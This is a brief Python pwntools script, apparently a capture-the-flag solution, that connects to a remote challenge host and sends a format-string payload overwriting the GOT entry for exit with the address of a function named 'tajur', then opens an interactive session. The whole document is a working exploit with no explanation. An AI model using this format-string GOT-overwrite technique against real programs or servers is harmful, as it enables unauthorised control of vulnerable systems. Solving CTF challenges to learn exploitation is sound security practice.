from pwn import *

e = context.binary = ELF('./chall')

p = remote('103.185.44.122', 27429)

payload_writes = {
        e.got['exit']: e.sym['tajur']
}

payload = fmtstr_payload(6,payload_writes)
p.sendline(payload)
p.interactive()